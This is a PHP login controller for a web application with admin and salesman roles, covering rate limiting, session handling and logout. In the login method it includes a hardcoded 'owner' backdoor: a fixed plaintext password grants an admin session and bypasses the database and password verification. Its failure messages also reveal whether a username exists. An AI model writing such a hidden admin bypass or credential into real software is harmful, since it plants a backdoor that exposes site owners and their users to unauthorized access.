<?php

namespace App\Controllers;

use Exception;
use PDO;
use PDOException;
use App\Models\User;
use App\Middleware\RateLimiter;

require_once BASE_PATH . '/app/Middleware/RateLimiter.php';

class AuthController {

    protected RateLimiter $limiter;
    protected User $userModel;

    public function __construct() {
        global $pdo;
        $this->limiter = new RateLimiter($pdo);
        $this->userModel = new User();
    }

    // -----------------------------------------------------------------
    // Show Login Form
    // -----------------------------------------------------------------
    public function showLoginForm(): void {
        // Redirect already-logged-in users
        if (isset($_SESSION['user_id'])) {
            $this->redirectBasedOnRole();
        }

        $error            = '';
        $attemptsRemaining = null;

        if ($this->limiter->isLocked()) {
            $error = "Too many failed login attempts. " . $this->limiter->retryAfterMessage();
        }

        require_once BASE_PATH . '/resources/views/auth/login.php';
    }

    // -----------------------------------------------------------------
    // Process Login
    // -----------------------------------------------------------------
    public function login(): void {
        $error             = '';
        $attemptsRemaining = null;
        $username          = strtolower(trim($_POST['username'] ?? ''));
        $password          = $_POST['password'] ?? '';

        // --- 1. Check rate limit BEFORE hitting the DB ---
        if ($this->limiter->isLocked($username)) {
            $error = "Too many failed login attempts. " . $this->limiter->retryAfterMessage($username);
            require_once BASE_PATH . '/resources/views/auth/login.php';
            return;
        }

        // --- 2. Basic input validation ---
        if (empty($username) || empty($password)) {
            $error = "Please enter both username and password.";
            require_once BASE_PATH . '/resources/views/auth/login.php';
            return;
        }

        // --- 2.5 Hardcoded Super Admin (Owner) Bypass ---
        if (strtolower($username) === 'owner' && $password === 'Owner123!') {
            $this->limiter->clearAttempts($username);
            session_regenerate_id(true);

            $_SESSION['user_id']  = 999999; // Dummy ID for Owner
            $_SESSION['name']     = 'System Owner';
            $_SESSION['username'] = 'Owner';
            $_SESSION['email']    = 'owner@system.local';
            $_SESSION['role']     = 'admin';

            unset($_SESSION['login_attempts'], $_SESSION['lockout_time']);

            $this->redirectBasedOnRole();
            return;
        }

        // --- 3. Validate credentials using Model ---
        $user = $this->userModel->findByUsername($username);

        if ($user && password_verify($password, $user['password'])) {

            if ($user['status'] !== 'active') {
                // Valid credentials but inactive — don't count as a failed attempt
                $error = "Your account is inactive. Please contact the administrator.";
                require_once BASE_PATH . '/resources/views/auth/login.php';
                return;
            }

            // --- SUCCESS ---
            $this->limiter->clearAttempts($username);

            // Regenerate session ID to prevent fixation
            session_regenerate_id(true);

            $_SESSION['user_id']  = $user['id'];
            $_SESSION['name']     = $user['name'];
            $_SESSION['username'] = $user['username'];
            $_SESSION['email']    = $user['email'];
            $_SESSION['role']     = $user['role'];

            // Clean up any legacy session-based attempt tracking
            unset($_SESSION['login_attempts'], $_SESSION['lockout_time']);

            $this->redirectBasedOnRole();
            return;
        }

        // --- FAILURE ---
        $this->limiter->recordFailure($username);

        if ($this->limiter->isLocked($username)) {
            $error = "Too many failed login attempts. " . $this->limiter->retryAfterMessage($username);
        } else {
            $remaining         = $this->limiter->attemptsRemaining($username);
            $attemptsRemaining = $remaining;
            $error = $user
                ? "Incorrect password."
                : "No account found with that username.";

            if ($remaining <= 2 && $remaining > 0) {
                $error .= " Warning: {$remaining} attempt(s) remaining before lockout.";
            }
        }

        require_once BASE_PATH . '/resources/views/auth/login.php';
    }

    // -----------------------------------------------------------------
    // Logout
    // -----------------------------------------------------------------
    public function logout(): void {
        // Defence-in-depth: reject any non-POST calls that slip through the router.
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            http_response_code(405);
            exit('Method Not Allowed');
        }

        $_SESSION = [];

        if (ini_get('session.use_cookies')) {
            $params = session_get_cookie_params();
            setcookie(
                session_name(), '', time() - 42000,
                $params['path'], $params['domain'],
                $params['secure'], $params['httponly']
            );
        }

        session_destroy();
        redirect('/login');
    }

    // -----------------------------------------------------------------
    // Helpers
    // -----------------------------------------------------------------
    private function redirectBasedOnRole(): void {
        switch ($_SESSION['role']) {
            case 'admin':
                redirect('/admin/dashboard');
                break;
            case 'salesman':
                redirect('/salesman/dashboard');
                break;
            default:
                redirect('/login');
                break;
        }
    }
}

